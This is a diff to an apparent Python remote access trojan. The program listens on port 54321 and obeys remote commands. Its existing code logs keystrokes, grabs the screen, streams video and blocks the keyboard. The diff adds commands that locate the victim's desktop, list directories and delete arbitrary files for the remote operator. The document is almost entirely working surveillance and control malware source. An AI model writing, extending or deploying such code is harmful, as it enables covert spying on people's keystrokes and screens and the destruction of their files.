@@ -1,4 +1,5 @@
 import socket
+from sys import getdefaultencoding
 from PIL import ImageGrab
 import base64
 import os
@@ -10,15 +11,25 @@ import threading
 import keyboard
 from getmac import get_mac_address as gma
 from vidstream import StreamingServer
+import pickle
 
 HOST = "0.0.0.0"
 PORT = 54321
 isConnected = False
 s = None
 streamServer = None
+nextStep = ""
+currentPath = ""
 
 
 def connect():
+    def getDirectory(startpath):
+        for root, dirs, files in os.walk(startpath):
+            dirfile = []
+            dirfile.append(dirs)
+            dirfile.append(files)
+            return dirfile
+
     def on_press(key):
         try:
             f.write(str(key.char))
@@ -66,6 +77,28 @@ def connect():
                 s.close()
                 connect()
                 break
+            elif encodedData == "-getDesktop-":
+                global currentPath
+                currentPath = os.path.join(os.path.join(
+                    os.environ['USERPROFILE']), 'Desktop')
+                conn.sendall(bytes(currentPath, "utf8"))
+
+            elif encodedData == "-getDirectory-":
+                data = conn.recv(1024).decode("utf8")
+                if os.path.isdir(data):
+                    currentPath = data
+                    dirfile = getDirectory(currentPath)
+                    conn.sendall(pickle.dumps(dirfile))
+                else:
+                    conn.sendall(bytes("invalid", "utf8"))
+            elif encodedData == "-deletefile-":
+                data = conn.recv(1024).decode("utf8")
+                try:
+                    os.remove(currentPath+"\\"+data)
+                    conn.sendall(bytes("success", "utf8"))
+                except:
+                    conn.sendall(bytes("fail", "utf8"))
+
             elif encodedData == "-getmac-":
                 conn.sendall(bytes(gma(), "utf8"))
             elif encodedData == "-blockKeyboard-":
